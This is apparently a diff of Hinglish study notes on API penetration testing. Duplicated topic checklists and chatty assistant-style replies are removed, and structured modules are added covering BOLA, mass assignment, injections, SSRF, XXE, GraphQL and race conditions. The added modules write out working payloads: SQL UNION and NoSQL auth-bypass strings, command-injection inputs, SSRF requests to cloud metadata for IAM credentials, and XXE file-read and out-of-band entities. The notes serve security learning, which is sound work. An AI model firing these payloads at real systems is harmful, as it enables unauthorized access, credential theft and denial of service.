-- **Currency / Unit Manipulation** – changing price, quantity, or discount parameters
-- **Workflow Bypass** – skipping steps in multi‑step processes (e.g., payment verification)
-- **Functionality Abuse** – using intended features maliciously (e.g., using support ticket system to spam)
-- **Time‑based Logic Flaws** – manipulating timestamps to gain unfair advantages
-
-#### 7. Advanced Reconnaissance & Discovery
-- **Documentation Mining**
-  - Swagger/OpenAPI, Postman collections, GraphQL playgrounds
-  - Extracting endpoints from comments, examples, and `deprecated` fields
-- **Active Discovery Tools**
-  - Kiterunner (context‑aware API fuzzing)
-  - Arjun / Param Miner (discovering hidden parameters)
-  - ffuf / gobuster for directory and file enumeration
-- **Passive Reconnaissance**
-  - GitHub dorks for API keys, tokens, or internal documentation
-  - JS file analysis using tools like **LinkFinder**, **JSScanner**
-  - Mobile app decompilation to extract API endpoints and secrets
-
-#### 8. Advanced Tooling & Burp Extensions
-- **Burp Suite Extensions**
-  - **Autorize** – automated authorization testing
-  - **Authz** – privilege escalation checks
-  - **JSON Web Tokens** (by d3adc0de) – JWT manipulation
-  - **GraphQL Raider** – GraphQL testing
-  - **Backslash Powered Scanner** – advanced parameter parsing
-- **Postman / Newman** – scripting API tests, collection‑based automation
-- **Custom Automation** – writing Python scripts with `requests` for large‑scale testing
-
-#### 9. Modern Security Misconfigurations
-- **CORS (Cross‑Origin Resource Sharing)**
-  - Overly permissive `Access-Control-Allow-Origin` reflecting arbitrary origins
-  - Preflight request bypass via `null` origin
-- **HTTP Parameter Pollution (HPP)**
-  - Duplicate parameters leading to WAF bypass or logic confusion
-- **Cache Poisoning / Cacheable Sensitive Data**
-  - Leaking authenticated responses via shared caches
-- **Insecure Direct Object References for Files** – path traversal in file download/upload APIs
-- **Verbose Stack Traces** in production error responses
-
-#### 10. Advanced Injection Techniques
-- **Second‑order SQL Injection**
-- **Blind NoSQL Injection** – time‑based or conditional responses
-- **LDAP, XXE, and XPath Injection** in APIs
-- **Command Injection** in API parameters (e.g., `ping`, `nslookup`)
-
-#### 11. Rate Limiting & Throttling Testing
-- **Bypassing Rate Limits**
-  - IP rotation (VPN, proxies, IPv6)
-  - Using different endpoints that share the same resource
-  - Adding junk parameters to fingerprint
-  - Slowing down request rate to stay under threshold
-- **Testing for Lack of Rate Limits** – on authentication, password reset, OTP, and high‑value actions
-
-#### 12. API Versioning & Deprecation
-- **Exposed Alpha / Beta / Debug Endpoints**
-- **Version Rollback Attacks** – forcing downgrade to a vulnerable version
-- **Deprecated API Testing** – finding unmaintained endpoints with known flaws
-
-#### 13. Compliance & Reporting
-- **CVSS Scoring** for discovered vulnerabilities
-- **Proof of Concept (PoC)** writing
-- **Remediation Guidance** tailored to API frameworks (e.g., Spring Boot, Express, Django REST)
-
-### 1. Reconnaissance & Discovery (Advanced)
-*   **API Documentation Mining**
-    *   Swagger/OpenAPI Specification files (`swagger.json`, `openapi.yaml`) analysis.
-    *   Postman Collection exports hidden in JS files.
-    *   GraphQL Playground/Introspection endpoint discovery.
-*   **Automated Content Discovery**
-    *   **Kiterunner:** Context-aware API route fuzzing (better than generic dirbuster).
-    *   **Arjun/Param Miner:** Hidden parameter discovery (headers, JSON body, cookies).
-    *   **Subdomain Enumeration:** Finding `api.*, dev.*, staging.*` endpoints.
-*   **Version Control & Leak Search**
-    *   GitHub/GitLab dorks for API keys, secrets, and internal docs.
-    *   **JS File Analysis:** Using tools like **LinkFinder** or **SubJS** to extract endpoints from minified JS.
-
-### 2. Authentication & Session Management (Advanced)
-*   **OAuth 2.0 & OIDC Flaws**
-    *   **Redirect URI Manipulation:** Open redirect leading to Auth Code interception.
-    *   **State Parameter Missing:** CSRF attacks on login flows.
-    *   **Implicit Flow Risks:** Token leakage in URL fragments/browser history.
-    *   **PKCE Implementation Errors:** Authorization Code interception without PKCE.
-*   **JWT Advanced Attacks**
-    *   **Algorithm Confusion:** RS256 to HS256 switch (using public key as secret).
-    *   **Key Injection (`kid`):** Path traversal (`../../dev/null`) or SQLi in Key ID.
-    *   **JWK/JWKS Injection:** Hosting own key set and forcing server to use it (`jku` header).
-    *   **None Algorithm:** Removing signature verification entirely.
-*   **Session Security**
-    *   **Session Fixation:** Forcing a known session ID upon login.
-    *   **Refresh Token Rotation:** Checking if old refresh tokens are invalidated after use.
-    *   **Concurrent Session Control:** Testing limits on multiple active sessions.
-
-### 3. Authorization (OWASP API Top 10 2023 Focus)
-*   **Broken Object Level Authorization (BOLA/IDOR)**
-    *   **Chained BOLA:** Using one IDOR to leak an ID for a second exploit.
-    *   **Bulk/Batch BOLA:** Sending arrays of IDs in JSON to dump multiple records.
-    *   **Non-Resource IDOR:** Manipulating IDs in actions like `delete`, `update`, `password_reset`.
-*   **Broken Property Level Authorization (BPLA)**
-    *   **Mass Assignment (Advanced):** Injecting `role: admin`, `is_verified: true`, `balance: 999`.
-    *   **Nested JSON Manipulation:** Modifying deeply nested objects to bypass validation.
-    *   **Excessive Data Exposure:** Filtering responses to find sensitive fields (PII, keys) returned but not shown in UI.
-*   **Broken Function Level Authorization**
-    *   **Admin Endpoint Access:** Accessing `/api/admin/*` endpoints as a low-privilege user.
-    *   **HTTP Verb Tampering:** Changing `GET` to `PUT/DELETE` to bypass ACLs.
-
-### 4. Injection & Input Validation (Beyond SQL/NoSQL)
-*   **Server-Side Request Forgery (SSRF)**
-    *   **Cloud Metadata Access:** Fetching `169.254.169.254` (AWS/Azure/GCP) via API parameters.
-    *   **Webhook SSRF:** Providing attacker-controlled URL in webhook configuration.
-    *   **Blind SSRF:** Using DNS/HTTP callbacks (Burp Collaborator) to detect out-of-band hits.
-*   **XML External Entity (XXE)**
-    *   Testing `Content-Type: application/xml` endpoints for entity expansion.
-    *   Error-based vs. Blind XXE in API payloads.
-*   **Command Injection**
-    *   OS command injection via parameters (e.g., `ping`, `nslookup` in diagnostic APIs).
-    *   Template Injection (SSTI) in dynamic response fields.
-*   **GraphQL Specifics**
-    *   **Introspection Query:** Dumping full schema to understand types/mutations.
-    *   **Deep Recursion/DoS:** Nested queries causing server resource exhaustion.
-    *   **Batching Attacks:** Sending hundreds of operations in one request to bypass rate limits.
-
-### 5. Business Logic & Rate Limiting
-*   **Race Conditions**
-    *   **Turbo Intruder:** Testing concurrent requests for coupon abuse, money transfer, or voting.
-    *   **Time-of-Check to Time-of-Use (TOCTOU):** Exploiting delays between validation and execution.
-*   **Workflow Bypass**
-    *   Skipping steps in multi-step processes (e.g., going directly to "Payment Success" API).
-    *   Force browsing to next stage endpoints without completing previous validation.
-*   **Rate Limiting Bypass**
-    *   **IP Rotation:** Using X-Forwarded-For headers or proxy chains.
-    *   **Parameter Pollution:** Adding random parameters to bypass fingerprinting.
-    *   **Endpoint Swapping:** Finding alternative endpoints that perform the same action without limits.
-*   **Financial Logic**
-    *   **Negative Values:** Testing quantities or prices with negative numbers.
-    *   **Currency Manipulation:** Changing currency codes without converting amounts.
-    *   **Decimal Precision:** Using excessive decimals to confuse calculation logic.
-
-### 6. Infrastructure & Misconfiguration
-*   **CORS Misconfiguration**
-    *   `Access-Control-Allow-Origin: *` with `Allow-Credentials: true`.
-    *   Reflecting arbitrary origins without whitelist validation.
-    *   Bypassing null origin restrictions.
-*   **HTTP Security Headers**
-    *   Missing `Strict-Transport-Security (HSTS)`, `Content-Security-Policy (CSP)`.
-    *   Verbose Error Messages leaking stack traces or DB versions.
-*   **API Versioning Risks**
-    *   Accessing deprecated versions (`/v1/`) that lack new security controls.
-    *   Debug/Beta endpoints left enabled in production (`/api/debug`, `/api/test`).
-*   **Content-Type Smuggling**
-    *   Changing `application/json` to `application/x-www-form-urlencoded` to bypass parsers.
-    *   Mixing content types to confuse WAF or backend logic.
-
-### 7. Modern Architecture (Cloud & Serverless)
-*   **Serverless API Risks**
-    *   **Event Injection:** Manipulating JSON events triggering Lambda/Cloud Functions.
-    *   **Denial of Wallet:** Triggering expensive operations to inflate cloud costs.
-    *   **Cold Start Exploitation:** Timing attacks during function initialization.
-*   **Webhook Security**
-    *   Lack of Signature Verification (HMAC) on incoming webhooks.
-    *   Replay Attacks due to missing timestamps/nonces.
-*   **Microservices Communication**
-    *   Service-to-Service Auth bypass (missing mTLS or internal API keys).
-    *   Internal API exposure via misconfigured Service Mesh (Istio/Linkerd).
-
-### 8. Professional Tooling & Automation
-*   **Burp Suite Extensions**
-    *   **Autorize/AuthMatrix:** Automated privilege escalation testing.
-    *   **Logger++:** Advanced traffic logging and filtering.
-    *   **JSON Web Tokens:** Built-in decoding and editing within Burp.
-    *   **HTTP Request Smuggler:** Detecting CL.TE / TE.CL vulnerabilities.
-*   **CLI & Scripting**
-    *   **Postman/Newman:** Automating collection runs for regression testing.
-    *   **Python Requests:** Custom scripts for complex logic attacks (Race conditions).
-    *   **Nuclei:** Using API-specific templates for quick vulnerability scanning.
-
-    Bhai, maine aapke notes (Page 1 se Page 19 tak) ko fir se **bohot deeply analyze** kiya hai.
-
-Aapko lag raha hai ki saare topics hain kyunki aapne mere pichle response wali "Missing Topics" ki list ko hi apne notes ke end mein paste kar diya hai. Lekin agar hum aapke **actual handwritten/study notes (Page 1-19)** ki baat karein, toh wahan sirf unka zikr (mention) hai, unki **exploitation techniques, practical steps, aur deep-dive methods** missing hain.
-
-Ek **Senior Security Researcher** ke taur par, "Yes", abhi bhi kaafi crucial cheezein missing hain jo real-world corporate pentesting mein zaruri hoti hain.
-
-Niche un missing items ki structured list di gayi hai:
-
----
-
-## 1. Advanced Reconnaissance & Discovery
-
-Aapne fuzzing aur JS files touch kiya hai, lekin professional setup mein ye missing hai:
-
-* **Documentation Mining:** Swagger UI (`/swagger-ui.html`), OpenAPI (`/v2/api-docs`), aur Postman collections ko hidden JS paths se extract karna.
-* **Contextual Fuzzing:** **Kiterunner** ka use (generic wordlists API routes ke liye kaam nahi karti, context-aware fuzzing chahiye).
-* **Hidden Parameter Discovery:** **Arjun** ya Burp ka **Param Miner** use karke hidden headers (jaise `X-Forwarded-For`, `X-Admin-User`) dhoondna.
-
-## 2. Broken Authorization (BOLA & BPLA)
-
-Aapne Page 7 par simple `vehicleId` manipulation (IDOR) likha hai, lekin industry-standard BOLA attacks missing hain:
-
-* **Bulk BOLA:** JSON array injection (e.g., `{"ids": [123, 124, 125]}`) se multiple users ka data ek saath nikalna.
-* **UUID/GUID Brute-forcing:** Jab IDs predictable nahi hoti, tab unhe leak karne ke sources dhoondna (Logs, Analytics, Referer headers).
-* **BPLA (Broken Property Level Authorization):** * **Excessive Data Exposure:** Response mein PII (Sensitive info) dhoondna jo frontend ko nahi chahiye par server bhej raha hai.
-* **Advanced Mass Assignment:** Sirf request method nahi, balki hidden parameters (e.g., `"is_admin": true`) ko POST/PUT requests mein inject karna.
-
-
-
----
-
-## 3. Advanced JWT Exploitation
-
-Aapne HMAC (HS256) brute-force aur `jwt.io` cover kiya hai, lekin ye critical attacks missing hain:
-
-* **Algorithm Confusion (RS256 to HS256):** Asymmetric public key ko as a symmetric secret use karke token sign karna.
-* **Header Injection:** * `kid` (Key ID) injection: Iske andar SQLi ya Directory Traversal (`../../dev/null`) try karna.
-* `jku`/`x5u` manipulation: Server ko force karna ki wo aapke malicious server se public key uthaye.
-
-
-* **None Algorithm Attack:** Signature part ko completely blank karke logic bypass karna.
-
-## 4. Modern Architecture & Specialty APIs
-
-Aapke notes mostly REST APIs par hain. Modern apps mein ye missing hai:
-
-* **GraphQL Specific Attacks:**
-* **Introspection Queries:** Poora database schema dump karna.
-* **Circular Queries:** DoS attack ke liye nested queries bhejna.
-
-
-* **SSRF (Server-Side Request Forgery):** API parameters ke zariye server se internal metadata (`169.254.169.254`) ya internal services ko hit karwana.
-* **Webhook Security:** Missing signature verification aur replay attacks in incoming webhooks.
-
----
-
-## 5. Complex Business Logic & Race Conditions
-
-Aapne Clickjacking aur OTP spam (No-Rate limit) cover kiya hai, lekin professional level par ye missing hai:
-
-* **Race Conditions:** **Turbo Intruder** use karke ek hi second mein multiple requests bhejna taaki "Double Spending" ya "Coupon Abuse" ho sake.
-* **Workflow Bypass:** Multi-step transactions mein beech ke verification steps skip karna (e.g., skipping `verify-otp` path and calling `update-password` directly).
-
-## 6. Professional Tooling (Burp Extensions)
-
-Corporate reporting ke liye manual testing ke saath-saath ye automation tools missing hain:
-
-* **Autorize:** Automated authorization testing (BOLA detect karne ka sabse fast tareeka).
-* **AuthMatrix:** Complex role-based access control (RBAC) test karne ke liye.
-* **Nuclei:** API-specific templates se vulnerability scan karna.
-
----
-
-Bhai, main samajh gaya aapne kya kiya hai. Aapne mere pichle response wali **"Missing Topics" ki list** ko apne notes ke end mein as a checklist append kar diya hai. Technically, ab aapke paas un topics ke *naam* toh hain, lekin unke **practical notes, payloads, aur exploitation methodology** abhi bhi missing hain.
-
-Ek **Senior Security Researcher** sirf headings nahi rakhta, uske paas unka "How-to" hona chahiye. Agar main un checklists ko hata doon aur sirf aapke actual handwritten-style notes (Page 1-19) ko analyze karun, toh **industry-standard depth** ke hisaab se ye specific sub-topics abhi bhi missing hain:
-
----
-
-## 1. Advanced Injection Vectors (Beyond SQL/NoSQL)
-
-Aapne database injections toh cover kiye hain, lekin API parameters ke through hone wale ye attacks missing hain:
-
-* **XXE (XML External Entity) in APIs:** Kai APIs `application/json` ke saath-saath `application/xml` bhi accept karti hain. Content-Type switch karke local files read karna (`/etc/passwd`) ya internal ports scan karna missing hai.
-* **SSTI (Server-Side Template Injection):** Agar API response mein user input ko template engine (Jinja2, Handlebars) ke through render karti hai, toh RCE (Remote Code Execution) kaise lena hai?
-* **OS Command Injection:** API parameters (like `?image=test.jpg`) ke piche agar system commands chal rahi hain, toh `; sleep 10` ya `| id` jaise payloads ka use.
-
-## 2. Protocol Specific Hacking
-
-Duniya sirf REST APIs par nahi chalti. Modern apps mein ye protocols use ho rahe hain jo aapke notes mein nahi hain:
-
-* **WebSocket Security:** Real-time APIs (chat, trading) WebSockets use karti hain. Inmein **CSWSH (Cross-Site WebSocket Hijacking)** aur lack of authorization kaise check karte hain?
-* **gRPC Pentesting:** High-performance microservices gRPC use karti hain. Iska proto-file dhoondna aur **Burp Suite's gRPC extension** se calls intercept karna missing hai.
-
-## 3. BOLA/IDOR (The "Deep" Part)
-
-Aapne Page 7 par simple manipulation likha hai, lekin corporate level par ye scenarios missing hain:
-
-* **BOLA via API Versioning:** `/v2/user/my-info` secure hai, lekin kya `/v1/user/other-id` vulnerable hai? Version downgrade attacks missing hain.
+## 🔑 Module 3: Authorization (BOLA, BPLA, BFLA)
+*Andar aane ke baad, kya kya kar sakte ho?*
+
+### Topic 3.1: BOLA / IDOR (Broken Object Level Authorization)
+* **Classic IDOR:** `GET /api/users/123` ko change karo `456`. Agar dusre user ka data mil gaya, BOLA hai. (Reference: **Page 7**)
+* **BOLA Attack Flow (Visual Samjho):**
+    1.  **Attacker:** Apni valid request intercept karta hai: `GET /api/v1/my-profile?id=attacker_id`.
+    2.  **Manipulation:** `id` ko change karta hai: `id=victim_id`.
+    3.  **Server Error:** Server check karta hai "Token valid hai?" (Yes), lekin "Kya ye user is ID ka owner hai?" ye check karna bhool jata hai.
+    4.  **Data Leak:** Attacker ko victim ka private JSON mil jata hai.
+* **Negative IDs:** `GET /api/users/-1` dekh kar dekho. Error message mein database ka info leak ho sakta hai. (Reference: **Page 7**)
+* **Bulk BOLA:** Kya API ek array accept karti hai? `POST /api/users/get` with body `{"ids": [123,124,125]}`. Agar saare users ka data dump kar diya, wo massive BOLA hai.
+* **UUID/GUID Brute-forcing:** Agar IDs `user-873hjd8` jaise hain, toh predictable nahi hain. Par kya wo kisi aur jagah leak ho rahe hain? (e.g., Referer header, logs, search results mein, ya JS files mein).
+* **Chained BOLA:** Pehle ek IDOR se dusre user ki ID leak karo, fir us ID se uske private data access karo.
+* **BOLA in Non-CRUD Operations:** Sirf GET/POST mein nahi, balki `DELETE /api/user/123`, `PUT /api/user/123/password` jaisi actions mein bhi try karo.
+* **BOLA via API Versioning:** `/v2/user/my-info` secure hai, lekin kya `/v1/user/other-id` vulnerable hai? Version downgrade attacks try karo.
 * **BOLA in Password Reset:** Reset link mein `user_id` ya `email` change karke kisi aur ka password reset kar dena.
 
----
+### Topic 3.2: BPLA / Mass Assignment (Broken Property Level Authorization)
+* **Hidden Properties:** Request mein extra properties bhej kar dekho. (Reference: **Page 15 - Mass Assignment**)
+    * `POST /api/user/update` with body `{"name":"sat", "isAdmin":true}`.
+    * `role: "superuser"`, `balance: 99999`, `verified: true`, `email_verified: true`.
+* **Nested JSON Manipulation:** Agar JSON nested hai, toh andar ki properties bhi change karo.
+    ```json
+    {
+      "user": {
+        "name": "sat",
+        "settings": {
+          "isAdmin": true
+        }
+      }
+    }
+    ```
+* **Excessive Data Exposure:** Response mein sensitive fields dhoondo jo frontend ko nahi dikh rahe hain. Jaise server bhej raha hai `"mobile": "9876543210"` lekin UI mein sirf last 4 digits dikha raha hai. Iska matlab data leak ho raha hai.
+* **HTTP Verb Tampering:** Pata karo ki kaunse methods allowed hain. (Reference: **Page 15**)
+    * Intruder mein HTTP verbs (`GET, POST, PUT, DELETE, PATCH, OPTIONS`) daal kar fuzz karo.
+    * Agar kisi endpoint par `POST` allowed nahi hona chahiye par milta hai (`200 OK`), toh wo method enabled hai. Ab us method se attack karo.
 
-## 4. Bypassing API Gateways & WAFs
-
-Real corporate environments mein API Gateway (like Apigee, AWS API Gateway) hota hai. Use bypass karne ki techniques:
-
-* **HTTP Parameter Pollution (HPP):** Same parameter do baar bhejna (`?id=123&id=456`) taaki WAF confuse ho jaye.
-* **Method Override:** Agar `DELETE` blocked hai, toh `POST` request mein `X-HTTP-Method-Override: DELETE` header use karna.
-* **IP Rotation:** Rate limit bypass karne ke liye `X-Forwarded-For` header mein random IPs rotate karna.
-
-## 5. Modern JWT Attacks (The "Hard" Part)
-
-Aapke notes mein simple brute-force hai, lekin ye exploits missing hain:
-
-| Attack Type | Technique |
-| --- | --- |
-| **JTI Replay** | `jti` claim ka check na hona, jiski wajah se purana token baar-baar use kiya ja sake. |
-| **KID Path Traversal** | `kid` header mein `../../dev/null` dalkar signature bypass karna. |
-| **JWT Heartbleed-style** | `alg: none` ke saath token modify karna (modern libraries mein abhi bhi kahin-kahin milta hai). |
-
----
-
-## 6. Business Logic: Financial & Multi-step Flaws
-
-Aapke notes mein Clickjacking hai, lekin ye business-critical attacks missing hain:
-
-* **Race Conditions in Wallets:** Ek hi second mein 100 requests bhej kar (Turbo Intruder se) balance zero hone se pehle multiple transactions kar lena.
-* **Negative Quantities:** E-commerce API mein `quantity: -1` dalkar total price kam karna.
-* **Step Skipping:** Signup process mein `verify-otp` step ko skip karke seedha `account-success` endpoint call karna.
+### Topic 3.3: BFLA (Broken Function Level Authorization)
+* **Admin Endpoint Access:** `/api/admin/users`, `/api/admin/delete` jaise endpoints ko low-privilege user se access karne ki koshish karo.
+* **Method Tampering:** Agar `GET /api/admin/users` blocked hai, toh `POST /api/admin/users` ya `PUT` try karo.
 
 ---
 
-### My Verdict
+## 💉 Module 4: Modern Injections & Resource Abuse (SQL, NoSQL, SSRF, XXE, Unrestricted Consumption)
 
-Bhai, aapka base solid hai, lekin aapke notes abhi **"Web-focused"** zyada hain aur **"Pure API-focused"** kam. Aapne jo checklist niche add ki hai, usmein se har topic ke liye aapko **kam se kam 2-3 practical payloads** aur **Burp Suite steps** add karne chahiye tab jaakar aapka notebook "Master" notebook banega.
+### Topic 4.1: SQL Injection
+* **Fuzzing Approach:** (Reference: **Page 10-11**)
+    * Request ko Intruder mein bhejo. Parameter ke aage `$1$` mark karo.
+    * Payloads mein se **"Fuzzing - SQL Injection"** select karo.
+    * Attack karo aur status code/length mein change dhoondo.
+* **Manual Exploitation:**
+    * Agar `id=5` vulnerable hai, toh `UNION SELECT` try karo:
+    * `GET /v1/001.php?id=5+UNION+SELECT+username,password,null,null+from+users--` (Reference: **Page 11**)
+* **Second-order SQLi:** Pehle payload database mein store karwao (e.g., signup mein `' OR 1=1;--` username se), aur baad mein kisi dusre feature mein use trigger karo.
 
-Bhai, aapne mere pichle responses ki **"Missing Topics"** wali list ko as a checklist apne notes mein add toh kar liya hai, lekin ek Senior Pentester ki nazar se dekhun toh aapke paas unka sirf **"Index"** hai, **"Knowledge"** nahi.
+### Topic 4.2: NoSQL Injection (MongoDB)
+* **Tech Detection:** (Reference: **Page 11-12**)
+    * Error message mein `MongoError`, `E11000` dhoondo.
+    * Response mein `_id`, `ObjectId` dhoondo.
+* **Authentication Bypass (Boolean-based):** (Reference: **Page 12-13**)
+    * **Original Query:** `db.users.find({"username": username, "password": password})`
+    * **Payload:**
+        * Username: `admin`
+        * Password: `{"$ne": null}`
+    * **Final Query:** `db.users.find({"username": "admin", "password": {"$ne": null}})`
+    * Matlab "jiska username admin ho aur password null na ho". Ye hamesha true hai. Bypass!
+* **Bypass both fields:** (Reference: **Page 13**)
+    * `username: {"$exists": true}, password: {"$ne": null}`
+* **Command Injection:** (Reference: **Page 14**)
+    * `$gt`: greater than. `username: {"$gt": ""}` -> Saare users jinka username empty string se bada hai (practically sabhi).
+    * `$where`: JavaScript execute karo. `username: {"$where": "this.username == 'admin'"}`. Ismein sleep payloads bhi daal sakte ho: `{"$where": "sleep(5000)"}`.
+* **Blind NoSQLi:** Response time ya error based conditions se data extract karo.
 
-Agar aap industry-ready hona chahte ho, toh abhi v kuch aisi **Deep-Level** cheezein hain jo aapne miss ki hain (Checklist mein v nahi hain). Ye wo topics hain jo senior-level interviews aur high-paying bug bounties mein kaam aate hain.
+### Topic 4.3: SSRF (Server-Side Request Forgery)
+* **Kaha dhoondo:** Endpoints jo URL accept karte hain (e.g., `?image_url=...`, `webhook=...`, `?file=...`, `?url=...`, `?path=...`).
+* **Payloads:**
+    * Internal cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS) ya `http://metadata.google.internal/` (GCP). Isse IAM credentials mil sakte hain.
+    * Internal services: `http://localhost:8080/`, `http://127.0.0.1/health`, `http://192.168.1.1/admin`.
+    * Port scan: `http://localhost:22`, `http://localhost:3306`.
+* **Blind SSRF:** Agar response mein data nahi dikhta, toh Burp Collaborator ya `https://webhook.site` use karo. Apna URL bhejo aur dekho ki server ne request ki ya nahi.
+* **Webhook SSRF:** Webhook URL field mein apna collaborator URL daalo.
 
-Niche di gayi list **Aakhri (Final) Wave** hai topics ki. Inhe cover kar liya, toh aapka "API Pentesting Bible" complete ho jayega.
+### Topic 4.4: XXE (XML External Entity)
+* **Kaha dhoondo:** APIs jo `Content-Type: application/xml` accept karti hain ya `Content-Type: application/json` ke saath bhi XML data accept kar leti hain.
+* **Payload (File Read):**
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <product>&xxe;</product>
+    ```
+* **Blind XXE:** Out-of-band data exfiltration.
+    ```xml
+    <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL"> %xxe;]>
+    ```
+
+### Topic 4.5: Command Injection
+* **Kaha dhoondo:** Endpoints jo system commands ki tarah behave karte hain (e.g., `?host=google.com`, `?ip=8.8.8.8`, `?file=test.pdf`).
+* **Payloads:**
+    * `; ls -la`
+    * `| whoami`
+    * `$(id)`
+    * `` `id` ``
+    * `|| ping -c 10 127.0.0.1`
+
+### Topic 4.6: SSTI (Server-Side Template Injection)
+* **Kaha dhoondo:** Response mein user input reflect ho raha ho, especially error messages ya profile pages mein.
+* **Payloads:** `{{7*7}}`, `${7*7}`, `{{7*'7'}}`. Agar response mein `49` ya `7777777` dikhe, toh SSTI hai.
+* **RCE:** Fir template engine ke hisaab se RCE payloads daalo (Jinja2, Freemarker, etc.).
+
+### Topic 4.7: Unrestricted Resource Consumption (OWASP API 4:2023)
+* **Pagination Abuse:**
+    * Endpoint: `GET /api/products?limit=10` ko change karo `limit=1000000` ya `limit=999999999`.
+    * Agar server saare products ek saath bhejne ki koshish karta hai, toh memory exhaust ho sakti hai (DoS).
+* **Large Payloads:**
+    * JSON body mein 10MB ka random string bhejo. Agar server parse karne ki koshish karega, CPU usage high ho jayega.
+* **Array Overflow:** JSON array mein 1 lakh objects bhej do `[{"id":1}, {"id":2}, ...]`.
+* **Rate Limit Bypass:** (Iska detail **Module 5** mein hai, par yahan bhi mention kar do ki resource consumption se bhi DoS ho sakta hai).
 
 ---
 
-## 1. Improper Assets Management (OWASP API 9:2023)
+## 🚀 Module 5: GraphQL Security (Modern APIs)
 
-Checklist mein documentation mining hai, lekin ye scenarios missing hain:
+### Topic 5.1: GraphQL Discovery
+* Endpoints: `/graphql`, `/graphiql`, `/playground`, `/v1/graphql`.
+* **Introspection Query:** GraphQL endpoint ka poora schema nikal lo. Ye sabse pehla step hai.
+    ```graphql
+    query {
+      __schema {
+        types {
+          name
+          fields {
+            name
+            type {
+              name
+              kind
+            }
+          }
+        }
+      }
+    }
+    ```
+    Agar introspection off hai, toh **field suggestions** se bhi hints mil sakte hain. Galat field name likho to suggestion mein correct field name aa sakta hai.
 
-* **Shadow APIs:** Wo endpoints jo production mein hain par developer bhool gaye (e.g., `/api/v1.1/` jab `/v2/` chal raha ho).
-* **Environment Leakage:** Production API ke parameters use karke `dev`, `staging`, ya `test` environment ka data access karna (e.g., changing `origin=prod` to `origin=dev`).
-* **Unauthenticated Docs:** Kya Swagger/Redoc UI bina login ke accessible hai? Isse poora map mil jata hai.
-
-## 2. Unsafe Consumption of APIs (OWASP API 10:2023)
-
-Ye sabse naya aur complex topic hai.
-
-* **Third-Party Trust:** Maano aapka API kisi dusre service (like Stripe ya Twilio) se data leta hai. Agar hum third-party response ko "Spoof" ya "Manipulate" karein, toh aapka API kaise react karega?
-* **Injection via Integration:** Third-party API se aane wale data mein SQLi ya XSS payloads bhejna jo aapke database ko hit karein.
-
----
-
-## 3. Mobile-Specific API Interception
-
-Aap mobile development seekh rahe ho, toh ye aapke liye mandatory hai:
-
-* **SSL Pinning Bypass:** Real apps ka traffic Burp mein nahi dikhta kyunki wo "Pinning" use karte hain. Isse bypass karne ke liye **Frida** aur **Objection** tools ka use missing hai.
-* **Hardcoded Keys:** APK decompile karke `strings.xml` ya code mein se API Secrets aur Firebase keys nikalna.
-
----
-
-## 4. Advanced JWT: JWE & Timing Attacks
-
-Aapne signed tokens (JWS) cover kiye hain, lekin:
-
-* **JWE (JSON Web Encryption):** Jab token encrypted ho, tab use kaise analyze karein?
-* **Timing Attacks:** Kya server signature verify karne mein different time le raha hai for valid vs invalid signatures? Isse brute-force fast ho sakta hai.
-
-## 5. Cloud-Native API Risks
-
-Agar API AWS/Azure par hai:
-
-* **IAM Role Assumption via API:** SSRF ka use karke `iam/security-credentials/` se temporary access keys churaana.
-* **S3 Bucket exposure via API:** API endpoints jo files serve karte hain, kya wo direct S3 URLs leak kar rahe hain?
-
----
-
-## 6. Final Tooling & Automation (Summary Table)
-
-| Category | Missing Tool / Extension | Purpose |
-| --- | --- | --- |
-| **Automation** | **Nuclei** | API-specific templates se automatic CVE scan karna. |
-| **Logic** | **Turbo Intruder** | Race conditions aur massive rate limit testing. |
-| **Recon** | **Ffuf / Gobuster** | API route discovery with custom API wordlists. |
-| **GraphQL** | **InQL / GraphQL Raider** | GraphQL queries ko visualize aur manipulate karna. |
-
----
-
-### Comparison: Tutorial Standards vs. Industry Standards
-
-| Feature | Tutorial Standards (Aapke Current Notes) | Industry Standards (Required for Corporate) |
-| --- | --- | --- |
-| **IDOR** | Changing `?id=1` to `?id=2` | Bypassing UUIDs, Second-order IDORs, and Massive BOLA. |
-| **Rate Limit** | Sending 100 requests to login | IP Rotation using proxy-chains and Header manipulation. |
-| **JWT** | Brute-forcing with Hashcat | Key Confusion, `kid` injection, and JTI Replay. |
-| **Injection** | Simple `' OR 1=1` | Blind Out-of-band (OAST) injections using Collaborator. |
+### Topic 5.2: GraphQL Attacks
+* **Batching Attack:** Ek request mein 100+ queries bhej kar rate limit bypass aur resource exhaustion.
+    ```graphql
+    query q1 { user(id:1) { name } }
+    query q2 { user(id:2) { name } }
+    # ... up to 100 queries
+    ```
+* **Deep Recursion (Cyclical Queries):** Aisi query bhejo ki database crash ho jaye.
+    ```graphql
+    query {
+      user {
+        friends {
+          user {
+            friends {
+              user {
+                friends {
+                  name
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+    ```
+* **Directive-based Attacks:** `@include` aur `@skip` directives ko manipulate karke condition bypass karna.
+* **GraphQL IDOR:** Predictable global IDs ka use karke dusre objects access karna.
 
 ---
 
-### Aab Aapko Kya Karna Hai?
+## 🔄 Module 6: Business Logic & Rate Limiting
 
-Bhai, aapke paas list poori hai. Lekin **Industry Use** ke liye aapko in "Names" ko "Actionable Payloads" mein badalna hoga.
+### Topic 6.1: Workflow Bypass
+* **Scenario:** Signup process -> (1) Register (2) Verify OTP (3) Success.
+* **Attack:** Step 1 complete karne ke baad, seedha Step 3 ka endpoint call karo (`/api/success`). Agar skip kar diya, vulnerable hai.
+* **Force Browsing:** Step 2 ke baad Step 3 ka URL guess karo.
 
-**Kya aap chahte hain ki main Page 20 ke liye "SSL Pinning Bypass (Mobile API)" ya "Race Conditions with Turbo Intruder" mein se kisi ek ka practical guide (with payloads) likhun?**
+### Topic 6.2: Race Conditions (Turbo Intruder)
+* **Scenario:** Coupon code ek baar use ho sakta hai. Ek hi second mein 50 requests bhej do us coupon ke saath. Agar 2 baar apply ho gaya, Race Condition hai.
+* **Scenario:** Wallet mein se paisa nikalna. Balance check hone aur deduct hone ke beech mein multiple requests bhejo.
+* **Tool:** Burp Suite ka **Turbo Intruder** extension.
+    * Python script likho jo 50+ concurrent requests bheje.
+
+### Topic 6.3: Rate Limiting Bypass
+* **IP Rotation:**
+    * `X-Forwarded-For: <random IP>` header rotate karo. Burp mein `FoxyProxy` ya custom script use karo.
